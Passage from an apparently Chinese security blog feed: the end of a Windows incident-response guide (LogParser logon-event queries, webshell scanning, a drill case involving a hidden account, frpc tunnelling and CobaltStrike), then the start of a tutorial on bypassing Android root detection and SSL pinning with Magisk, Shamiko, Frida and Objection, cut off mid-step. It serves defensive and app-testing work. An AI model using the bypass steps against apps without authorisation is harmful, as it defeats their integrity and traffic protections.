，微软官方经典的日志分析工具，比较麻烦就是需要自己输入查询命令，下载安装完后在安装路径下 cmd 打开然后执行命令，即可可视化查看具体的事件<strong>（注意下列的命令中的日志路径需替换为自己需要分析的日志路径）</strong></p><ul><li>直接显示系统日志全部内容，不作筛选</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT -o:DATAGRID &quot;SELECT * FROM D:\Software\LogParser\logs\Security.evtx&quot;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026104201653.png" data-caption="image-20231026104201653"><img src="/../images/emergency/windows/image-20231026104201653.png" alt="image-20231026104201653"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026104223691.png" data-caption="image-20231026104223691"><img src="/../images/emergency/windows/image-20231026104223691.png" alt="image-20231026104223691"></a></p><ul><li>查看登录成功的所有事件，Event ID 为 4624</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT -o:DATAGRID  &quot;SELECT *  FROM D:\Software\LogParser\logs\Security.evtx where EventID=4624&quot;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026102932775.png" data-caption="image-20231026102932775"><img src="/../images/emergency/windows/image-20231026102932775.png" alt="image-20231026102932775"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026102444810.png" data-caption="image-20231026102444810"><img src="/../images/emergency/windows/image-20231026102444810.png" alt="image-20231026102444810"></a></p><ul><li>查看指定登录时间范围的事件, 2023-10-01 23:32:11 - 2023-10-26 23:34:00</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM D:\Software\LogParser\logs\Security.evtx where TimeGenerated&gt;&#x27;2023-10-01 23:32:11&#x27; and TimeGenerated&lt;&#x27;2023-10-26 23:34:00&#x27; and EventID=4624&quot;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026103107776.png" data-caption="image-20231026103107776"><img src="/../images/emergency/windows/image-20231026103107776.png" alt="image-20231026103107776"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026103228699.png" data-caption="image-20231026103228699"><img src="/../images/emergency/windows/image-20231026103228699.png" alt="image-20231026103228699"></a></p><ul><li>提取登录成功的用户名和 IP</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT  –o:DATAGRID  &quot;SELECT EXTRACT_TOKEN(Message,13,&#x27; &#x27;) as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as Username,EXTRACT_TOKEN(Message,38,&#x27; &#x27;) as Loginip FROM D:\Software\LogParser\logs\Security.evtx where EventID=4624&quot;</span><br></pre></td></tr></table></figure></div><ul><li>查看登录失败的所有事件，Event ID 为 4625</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM D:\Software\LogParser\logs\Security.evtx where EventID=4625&quot;</span><br></pre></td></tr></table></figure></div><ul><li>提取登录失败用户名进行聚合统计</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe  -i:EVT &quot;SELECT  EXTRACT_TOKEN(Message,13,&#x27; &#x27;)  as EventType,EXTRACT_TOKEN(Message,19,&#x27; &#x27;) as user,count(EXTRACT_TOKEN(Message,19,&#x27; &#x27;)) as Times,EXTRACT_TOKEN(Message,39,&#x27; &#x27;) as Loginip FROM D:\Software\LogParser\logs\Security.evtx where EventID=4625 GROUP BY Message&quot;</span><br></pre></td></tr></table></figure></div><ul><li>系统历史开关机记录</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT TimeGenerated,EventID,Message FROM D:\Software\LogParser\logs\Security.evtx where EventID=6005 or EventID=6006&quot;</span><br></pre></td></tr></table></figure></div><p>3）安全开源小工具 “windows日志一键分析小工具” , Github 地址 ：<a href="https://github.com/dogadmin/windodws-logs-analysis#windows%EF%BC%8C%E8%AF%A5%E5%B7%A5%E5%85%B7%E4%BC%9A%E8%B0%83%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%BF%9B%E7%A8%8B%EF%BC%8C%E5%BB%BA%E8%AE%AE%E4%BD%BF%E7%94%A8">https://github.com/dogadmin/windodws-logs-analysis#windows，该工具会调用系统进程，建议使用</a> windowslog-local.exe 在虚拟机使用，即将服务器日志拷贝在 c 盘在新建 log 文件夹，然后点击需要分析的功能即可。</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026105038015.png" data-caption="image-20231026105038015"><img src="/../images/emergency/windows/image-20231026105038015.png" alt="image-20231026105038015"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026104714454.png" data-caption="image-20231026104714454"><img src="/../images/emergency/windows/image-20231026104714454.png" alt="image-20231026104714454"></a></p><blockquote><p>中间件WEB日志</p></blockquote><p>在服务器端，相应的中间件若开启并设置相关的日志记录，则会对记录系统相应的请求信息或运行报错。</p><p>1、Apache Tomcat 日志，一般存放在 tomcat 目录下的 logs 文件夹中。</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026210234378.png" data-caption="image-20231026210234378"><img src="/../images/emergency/windows/image-20231026210234378.png" alt="image-20231026210234378"></a></p><p>2、Nginx 日志，一般亦会存放在 nginx 目录下的 logs 文件夹中，主要查看 access.log 访问日志文件，记录所有的HTTP请求信息。</p><p>和 error.log 错误日志文件，记录Nginx服务器的错误和警告信息。</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026210841866.png" data-caption="image-20231026210841866"><img src="/../images/emergency/windows/image-20231026210841866.png" alt="image-20231026210841866"></a></p><p>3、IIS 日志，一般存放在 %SystemDrive%\inetpub\logs\LogFiles，其中，<code>%SystemDrive%</code> 表示系统安装的驱动器（通常是 C:\）在 <code>LogFiles</code> 目录下，你会找到多个子目录，每个子目录对应一个网站或应用程序的日志文件。</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026213145485.png" data-caption="image-20231026213145485"><img src="/../images/emergency/windows/image-20231026213145485.png" alt="image-20231026213145485"></a></p><h3 id="3-7-木马查杀"><a href="#3-7-木马查杀" class="headerlink" title="3.7 木马查杀"></a>3.7 木马查杀</h3><p>1）webshell 查杀，在 Windows 下的应急查杀中，在服务器端没有其它的 edr 时候，针对 Webshell 的查杀，老朋友 “D盾” 依然是个不错的选择,下载地址：<a href="https://www.d99net.net/">https://www.d99net.net/</a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026105914781.png" data-caption="image-20231026105914781"><img src="/../images/emergency/windows/image-20231026105914781.png" alt="image-20231026105914781"></a></p><p>该工具的好处就是除了针对 webshell 的查杀，还有相关的辅助功能协助应急人员进行排查。</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026110133831.png" data-caption="image-20231026110133831"><img src="/../images/emergency/windows/image-20231026110133831.png" alt="image-20231026110133831"></a></p><h3 id="3-8-安全设备排查"><a href="#3-8-安全设备排查" class="headerlink" title="3.8 安全设备排查"></a>3.8 安全设备排查</h3><p>由于不同的单位购买的安全设备不一，有些单位只有单一的防火墙作为安全防护，所以此步骤应充分了解客户现场的安全设备情况，若有相应的态势、全流量、EDR 等安全设备可通过这些设备进行辅助排查，尽可能的获取更多的信息。</p><h3 id="3-9-小结"><a href="#3-9-小结" class="headerlink" title="3.9 小结"></a>3.9 小结</h3><p>以上就是针对 windwos 服务器端的基本入侵排查手法，当然上面端口、进程、启动项等的排查亦可通过 <strong>火绒剑</strong> 去进行辅助排查，使用优秀的工具可最大程度减轻应急人员的工作及负担。火绒剑独立版下载地址：<a href="https://www.52pojie.cn/thread-1358296-1-1.html">https://www.52pojie.cn/thread-1358296-1-1.html</a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026213742994.png" data-caption="image-20231026213742994"><img src="/../images/emergency/windows/image-20231026213742994.png" alt="image-20231026213742994"></a></p><h2 id="四、案例"><a href="#四、案例" class="headerlink" title="四、案例"></a>四、案例</h2><p>某次演练期间某单位接到上级通报，该单位被攻击队获取相应权限，需在规定时间内对单位涉事主机进行排查，并上交相关报告。任务转辗至此，接到应急任务后，在到达现场前已经大概了解事情的经过，被入侵网站为某外网单位部门网站, 攻击者利用漏洞上传后门木马。于是到达现场后便开展相关的入侵排查。</p><h3 id="4-1-服务器排查"><a href="#4-1-服务器排查" class="headerlink" title="4.1 服务器排查"></a>4.1 服务器排查</h3><blockquote><p> 检查系统用户情况</p></blockquote><p>通过排查发现服务器存在隐藏账号 <code>aaa$</code>，即当存在 $ 结尾的用户名时在 CMD 终端使用命令 <code>net user</code> 无法显示该用户，若只通过终端命令排查，而没有进一步排查则会错失重要信息，创建时间为5月25日10:40:35。</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/1-16983297055661.png" data-caption="1"><img src="/../images/emergency/windows/1-16983297055661.png" alt="1"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/2-16983297854053.png" data-caption="2"><img src="/../images/emergency/windows/2-16983297854053.png" alt="2"></a></p><blockquote><p> 排查异常文件</p></blockquote><p>通过排查，发现5月23日，系统存在黑客入侵痕迹，期间黑客不断进行文件上传操作，并成功上传多个后门木马文件。</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/3-16983299211735.png" data-caption="3"><img src="/../images/emergency/windows/3-16983299211735.png" alt="3"></a></p><p>对木马目录跟进排查，发现在相近时间内攻击者进行了大量的尝试攻击。</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/4-16983299788567.png" data-caption="4"><img src="/../images/emergency/windows/4-16983299788567.png" alt="4"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/5-16983300520589.png" data-caption="5"><img src="/../images/emergency/windows/5-16983300520589.png" alt="5"></a></p><p>跟进部分木马样本，打开查看，已相当清晰明了</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026222642682.png" data-caption="image-20231026222642682"><img src="/../images/emergency/windows/image-20231026222642682.png" alt="image-20231026222642682"></a></p><blockquote><p>端口、进程排查</p></blockquote><p>通过查看进程，发现系统存在 frpc.exe进程，攻击者通过该软件对内网资源进行漏洞探测，实现横向渗透操作。</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/12-169833082231513.png" data-caption="12"><img src="/../images/emergency/windows/12-169833082231513.png" alt="12"></a></p><p>定位文件路径为 <code>D:\Product\Home\UploadFile\2022\frpc.exe</code>，通过攻击者上传的frp软件，查看其配置文件定位到攻击者服务器 IP</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026223658311.png" data-caption="image-20231026223658311"><img src="/../images/emergency/windows/image-20231026223658311.png" alt="image-20231026223658311"></a></p><h3 id="4-2-安全设备排查"><a href="#4-2-安全设备排查" class="headerlink" title="4.2 安全设备排查"></a>4.2 安全设备排查</h3><p>由于已知道已被上传木马，现场有相应的安全设备，通过安全设备进行日志排查。安全设备上检测到5月25日带有攻击记录，通过此前上传的文件 t.5.aspx 请求内网资源。</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/9-169833063593511.png" data-caption="9"><img src="/../images/emergency/windows/9-169833063593511.png" alt="9"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/10-169833109274215.png" data-caption="10"><img src="/../images/emergency/windows/10-169833109274215.png" alt="10"></a></p><p>后续使用 CobaltStrike 进行后渗透操作。</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/11-169833120954717.png" data-caption="11"><img src="/../images/emergency/windows/11-169833120954717.png" alt="11"></a></p><h3 id="4-3-攻击-IP-溯源"><a href="#4-3-攻击-IP-溯源" class="headerlink" title="4.3 攻击 IP 溯源"></a>4.3 攻击 IP 溯源</h3><p>通过整合前面的信息，对 frp 服务端 IP 以及 CobaltStrike IP 进行简单信息获取。</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026224507781.png" data-caption="image-20231026224507781"><img src="/../images/emergency/windows/image-20231026224507781.png" alt="image-20231026224507781"></a></p><p>CobaltStrike 攻击者IP</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/17-169833184589922.png" data-caption="17"><img src="/../images/emergency/windows/17-169833184589922.png" alt="17"></a></p><p>出口 IP 企业相关信息。</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/18.png" data-caption="18"><img src="/../images/emergency/windows/18.png" alt="18"></a></p><h3 id="4-4-小结"><a href="#4-4-小结" class="headerlink" title="4.4 小结"></a>4.4 小结</h3><p>以上案例只是通过对应入侵排查思路小节进行相应的步骤展示，通过结合所学实际运用在真实环境中。</p><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>本篇幅通过了解 Windows 服务器的入侵手法进行简单的阐述，在实际的应急响应中，应急人员应该要有一个意识就是 <strong>“对一切事物保持一定的合理怀疑”</strong> 因为对于业务方来说，他们不一定知道哪一个信息会对应急排查起相关的作用，有些他们认为不重要的信息也许对于排查人员来说是一个关键的信息，又或许他们遗漏了某些信息，通过我们的询问会将某些信息带出来，增加排查思路。</p><h2 id="六、参考"><a href="#六、参考" class="headerlink" title="六、参考"></a>六、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://cloud.tencent.com/developer/article/2342371</span><br><span class="line">https://wiki.wgpsec.org/knowledge/hw/windows-emergency-response.html</span><br><span class="line">https://blog.csdn.net/wangyuxiang946/article/details/130076229</span><br><span class="line">https://www.cnblogs.com/starrys/p/17129993.html</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 应急响应系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APP测试系列-Android APP绕过安全检测机制</title>
      <link href="/2023/09/23/APP%E6%B5%8B%E8%AF%95%E7%B3%BB%E5%88%97-Android%20APP%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%E6%9C%BA%E5%88%B6/"/>
      <url>/2023/09/23/APP%E6%B5%8B%E8%AF%95%E7%B3%BB%E5%88%97-Android%20APP%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>前段时间遇到一个 APP 无法通过 <a href="https://funsiooo.github.io/2022/11/21/APP%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B5%81%E9%87%8F%E6%8A%93%E5%8C%85-Android%E7%AB%AF/">正常手段</a> 进行 HTTPS 流量的抓取， 且带有 Root 检测，Root 过的手机无法正常打开 APP，于是对该 APP 开展了简单的学习分析。</p><blockquote><p>问题场景：Android APP 、某厂商加壳、代理检测+root检测，无法通过正常手段抓取 HTTPS 流量。</p></blockquote><h2 id="二、绕过-ROOT-检测"><a href="#二、绕过-ROOT-检测" class="headerlink" title="二、绕过 ROOT 检测"></a>二、绕过 ROOT 检测</h2><p>Magisk 在 v24 版本之后取消了 Magisk hide 和在线仓库，现可直接通过 Zygisk（Magisk v24之后的版本自带）来实现对指定的 APP 进行 Root 隐藏。新版本 Magisk 下载地址：<a href="https://github.com/topjohnwu/Magisk/releases">https://github.com/topjohnwu/Magisk/releases</a> ，笔者使用版本为 Magisk 26.1，下载安装完成 Magisk 后重启手机（注意这属于 Root 部分，该文章不会详细阐述，请根据自己的手机上网搜索相关的文章进行安装）。</p><p>具体 APP 使用了 Root 检测导致 APP 无法正常使用情况，如：界面提示 Root 机器无法运行、 APP 软件闪退、软件卡在某一页面，等等情况。</p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/Root.png" data-caption="Root"><img src="/../images/app/bypass/Root.png" alt="Root"></a></p><blockquote><p>注意：手机刷入 Magisk 实现 Root 的手机环境需要自己提前准备，这边不作展示，因为每台机子有些许差异，笔者使用的是 Mi 8 刷 Pixel experience 环境，具体文章可参考：<a href="https://funsiooo.github.io/2023/04/04/Experience">APP测试系列-小米8 线刷 Pixel Experience</a></p></blockquote><h3 id="方法一：使用高版本-Magisk-绕过"><a href="#方法一：使用高版本-Magisk-绕过" class="headerlink" title="方法一：使用高版本 Magisk 绕过"></a>方法一：使用高版本 Magisk 绕过</h3><p>在 Magisk v24 之后 Zygisk 自带 “遵守排除列表” 功能，可通过该功能对指定的 APP 进行 Root 隐藏 ，即手机实际已经 Root 但手机可单独告诉指定的 APP： “我是 Android，我没 Root，开门让我进去”。具体操作： <code>打开 Magisk APP -》点击右上角设置-》点击开启 Zygisk-》重启手机-》再次打开 Magisk 进入设置打开遵守排除列表-》 点击配置排除列表-》 勾选需要隐藏 Root 的 App 程序</code> ，然后再次打开测试 APP 查看是否已经绕过了 Root 检测。</p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/%E7%BB%95%E8%BF%87Root-1.png" data-caption="绕过Root-1"><img src="/../images/app/bypass/%E7%BB%95%E8%BF%87Root-1.png" alt="绕过Root-1"></a></p><h3 id="方法二：使用-Shamiko-插件绕过"><a href="#方法二：使用-Shamiko-插件绕过" class="headerlink" title="方法二：使用 Shamiko 插件绕过"></a>方法二：使用 Shamiko 插件绕过</h3><p>当然除了自带的 Root 隐藏，也可以通过 Shamiko 插件模块进行 Root 隐藏，若第一种方法不行，可尝试这一种，这里提供多一个思路。具体插件安装步骤： <code>打开 Magisk APP -》点击右下角模块-》点击从本地安装找到提前下载的 Shamiko 插件安装包-》 点击重启,重启手机后查看模块出现 Shamiko 即安装完成</code> ，Shamiko 插件地址：<a href="https://github.com/LSPosed/LSPosed.github.io/releases">https://github.com/LSPosed/LSPosed.github.io/releases</a></p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/%E7%BB%95%E8%BF%87Root-2.jpg" data-caption="绕过Root-2"><img src="/../images/app/bypass/%E7%BB%95%E8%BF%87Root-2.jpg" alt="绕过Root-2"></a></p><p>安装完插件后就可以配置需要隐藏的 APP 列表绕过 Root 检测，具体操作： <code>打开 Magisk APP -》点击右上角设置-》关闭&quot;开启的遵守排除列&quot;-》重启手机-》重新打开 Magisk APP 右上角设置-》配置排除列表-》点击勾选需要绕过的 App</code> ，然后打开 APP 查看是否绕过了 Root 检测。</p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/%E7%BB%95%E8%BF%87Root-3.png" data-caption="绕过Root-3"><img src="/../images/app/bypass/%E7%BB%95%E8%BF%87Root-3.png" alt="绕过Root-3"></a></p><h3 id="方法差异"><a href="#方法差异" class="headerlink" title="方法差异"></a>方法差异</h3><p><strong>Shamiko 与 zygisk magisk自带的遵守排除列表的区别：</strong>若使用 zygisk magisk(即高版本 Magisk v24+) 自带的排除列表功绕过 Root 检测，这样排除列表中的应用则无法使用 magisk 和 xposed 模块，当想对某个排除列表中的应用使用虚拟框架和模块，就需要使用到 Shamiko 模块，这边只了解两种方法差异，不作详细探究。</p><h2 id="三、绕过-SSL-Pinning"><a href="#三、绕过-SSL-Pinning" class="headerlink" title="三、绕过 SSL Pinning"></a>三、绕过 SSL Pinning</h2><h3 id="Android-相关知识点"><a href="#Android-相关知识点" class="headerlink" title="Android 相关知识点"></a>Android 相关知识点</h3><blockquote><p>Hook 技术</p></blockquote><p><strong>Hook</strong> 通常被称为 <strong>钩子</strong>，指 Android 应用程序在运行中通过修改或扩展现有代码的行为来实现某种特定功能或实现定制化需求的技术。换个思路理解就类似于我们日常 Burp 抓包修改，当 Android 应用在运行过程中，我们通过 Hook 技术（钩子）插入或修改应用程序的代码使其执行我们想要效果。</p><p>其中主要 Hook 实现技术又分为：</p><ul><li><strong>动态代理：</strong>通过创建一个代理对象来拦截目标对象的方法调用，并在调用前后执行自定义代码。在 Android 中，可以使用 Java 的动态代理机制或者第三方库（如 Xposed、Frida 框架）来实现动态代理。</li><li><strong>字节码注入：</strong>通过修改应用程序的字节码来插入自定义的代码。这可以通过使用字节码操作库（如 ASM、DexPatcher）或者 Xposed 框架来实现。字节码注入可以在应用程序运行时修改代码逻辑，甚至可以替换整个方法的实现。</li></ul><blockquote><p>Hook 框架</p></blockquote><p><strong>Frida</strong></p><p>动态插桩工具包，Frida 允许开发者使用 JavaScript 编写自定义脚本与目标应用程序进行交互并修改其行为，Frida 还提供 了 API，可以进行动态代码注入、函数挂钩、内存操作、脱壳等。</p><p><strong>Xposed</strong></p><p>基于 Root 权限的框架，用于在 Android 设备上修改应用程序的行为。Xposed 的核心概念是 “挂钩”（hooking）即通过在应用程序的运行时环境中插入代码来拦截和修改方法调用，开发者可以在不修改应用程序源代码的情况下，对应用程序的行为进行修改和扩展。Xposed 模块通常使用 Java 或 Kotlin 编写，并且可以通过 Xposed 框架提供的 API 来与目标应用程序进行交互。</p><h3 id="HTTPS-加密机制"><a href="#HTTPS-加密机制" class="headerlink" title="HTTPS 加密机制"></a>HTTPS 加密机制</h3><p>通常对于 Android APP HTTPS 流量的抓取，笔者一般情况下习惯使用 Friddle + Burp 的组合进行流量的抓取，具体文章可参考：<a href="https://funsiooo.github.io/2022/11/21/APP%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B5%81%E9%87%8F%E6%8A%93%E5%8C%85-Android%E7%AB%AF/">APP测试系列-Android客户端流量抓包</a>，但当 APP 使用了其它的机制或加密方式则可能导致无法抓取该 APP HTTPS 的流量，这时候就需要分析一下 HTTPS 的加密机制了。</p><blockquote><p>SSL&#x2F;TLS 加密协议</p></blockquote><p>HTTPS 在 HTTP 基础上添加了 SSL&#x2F;TLS 加密层的协议，其中一用途就是为了防止 <strong>MITM中间人攻击</strong> 。日常我们使用 Burp 抓包也知道，想要获取 HTTPS 网站的明文数据包我们需要安装 Burp CA 证书才能拦截和解密通信数据，有时候我们在抓取 HTTPS 流量时，例如抓取安全设备网站页面通常数据包都是加密的，这是因为网站使用了较新的 TLS 版本和加密套件或者使用了特定的客户端证书，此时 Burp CA 证书的解密方式就失效了，所以就只能抓取到一窜加密的数据。</p><blockquote><p>SSL PINNING</p></blockquote><p>SSL pinning（SSL证书锁定）是一种用于增强应用程序安全性的技术，主要用在防止中间人攻击和证书欺骗。主要验证机制如下：</p><ul><li><strong>应用程序内置公钥：</strong>应用程序开发者将服务器的公钥或证书指纹嵌入到应用程序代码中，通常是在应用程序的配置文件或代码的特定位置。</li><li><strong>运行时验证：</strong>当应用程序建立与服务器的连接时，它会验证服务器的公钥或证书指纹是否与预置的值匹配。如果匹配成功，则建立安全连接；如果不匹配，则认为连接不安全，可能存在中间人攻击。</li></ul><p>通过 SSL Pinning，应用程序可以确保与服务器建立安全连接的过程中不被中间人攻击所破坏。即使攻击者使用伪造的证书，由于与预置的公钥或证书指纹不匹配，验证过程将失败，普通的 Burp CA 也就自然无法抓取该程序的 HTTPS 流量。</p><p><strong>如何判断应用程序使用了 SSL pinning ？</strong></p><p>在日常测试中，经过多次的前车之鉴，当常规方法不能抓取 HTTPS 流量时，自然而然就想到程序是否使用了 SSL Pinning ，当然我们也可以对程序的分析来进行判断。例如将该程序 apk 进行逆向分析，全局搜索其代码有没有使用如：<strong>HttpURLConnection、HttpClient、OkHttp、Volley</strong> 等库，并分析其逻辑，显然这种方式对于测试者来说过于复杂。所以我们直接跳过分析尝试绕过 SSL Pinning 若能抓到即为使用了 SSL Pinning 降低测试成本 。</p><h3 id="Frida-Objection-绕过-SSL-Pinning"><a href="#Frida-Objection-绕过-SSL-Pinning" class="headerlink" title="Frida + Objection 绕过 SSL Pinning"></a>Frida + Objection 绕过 SSL Pinning</h3><p>Frida 我们在前面已经简单的介绍过了，这边再引入一个开源工具：Objection ， Objection 是基于 Frida 框架开发的一个工具，它提供了一组便捷的功能和脚本，以简化在移动应用程序中使用 Frida 进行动态分析和漏洞利用的过程。其中 Objection 内置了 SSL Pinning 绕过脚本，所以我们可以尝试使用 Frida + Objection 去绕过 Android 应用的 SSL Pinning，具体步骤如下：</p><p>1、下载 adb 用于电脑与手机的连接，下载地址：<a href="https://developer.android.google.cn/studio/releases/platform-tools?hl=zh-cn">https://developer.android.google.cn/studio/releases/platform-tools?hl=zh-cn</a></p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/adb-1.png" data-caption="adb-1"><img src="/../images/app/bypass/adb-1.png" alt="adb-1"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/adb-2.png" data-caption="adb-2"><img src="/../images/app/bypass/adb-2.png" alt="adb-2"></a></p><p>2、使用具备数据传输的 usb 数据线，然后电脑与手机连接，需要开启手机的 <strong>开发者模式</strong> ，usb 使用文件传输模式，然后就可以使用 adb 连接手机 。 adb 目录下终端执行 <code>adb.exe devices</code> ，然后点击手机弹出的允许 USB 调试</p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/adb-3.png" data-caption="adb-3"><img src="/../images/app/bypass/adb-3.png" alt="adb-3"></a></p><p>然后 终端执行 <code>adb shell</code> 即可进入 Android adb shell ，默认为普通权限，<code>su</code> 后为 <code>root</code> 权限</p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/adb-4.png" data-caption="adb-4"><img src="/../images/app/bypass/adb-4.png" alt="adb-4"></a></p><p>3、电脑安装 Objection</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install objection</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/bypass/objection_install.png" data-caption="objection_install"><img src="/../images/app/bypass/objection_install.png" alt="objection_install"></a></p><p>因为 Objection 是依赖于 frida 框架的，所以再安装完 Objection，frida 也同步安装了，这时候需要查看电脑安装 frida 的版本，因为下一步<strong>手机上的 frida-server 版本必须要和电脑上的 frida 版本一致，不然会报错</strong>，此次 frida 版本为 16.1.4</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida --version</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/bypass/frida.png" data-caption="frida"><img src="/../images/app/bypass/frida.png" alt="frida"></a></p><p>4、手机上通过 adb 上传 frida-server 版本为 16.1.4，frida-server 下载地址: <a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 默认开启进入 adb shell 为 root 权限，因为上传需要 root 权限</span><br><span class="line">adb root</span><br><span class="line"></span><br><span class="line"># 上传 frida-server, data/app_tes 为目录路径可自定义</span><br><span class="line">adb push frida-server-16.1.4-android-arm64 data/app_test</span><br><span class="line"></span><br><span class="line"># 查看是否上传成功</span><br><span class="line">ls /data/app_test</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/bypass/adb-5.png" data-caption="adb-5"><img src="/../images/app/bypass/adb-5.png" alt="adb-5"></a></p><p>进入 <code>/data/app_test</code> 给予 <code>frida-server-16.1.4-android-arm64</code> 777 权限（运行需要）</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 进入 frida-server-16.1.4-android-arm64 所在的目录，这边为 /data/app_test</span><br><span class="line">cd data/app_test</span><br><span class="line"></span><br><span class="line"># 给与 777 权限</span><br><span class="line">chmod 777 frida-server-16.1.4-android-arm64</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/bypass/adb-6.png" data-caption="adb-6"><img src="/../images/app/bypass/adb-6.png" alt="adb-6"></a></p><p>5、准备利用 Objection 绕过 SSL Pinning，首先查找 app 的包名是什么，个人习惯使用 <a href="https://codeload.github.com/bihe0832/Android-GetAPKInfo/zip/refs/tags/V2.0.2">GetAPKInfo</a> 工具来获取 APP 包名，例如下面的例子</p><div class="highlight-wrap" 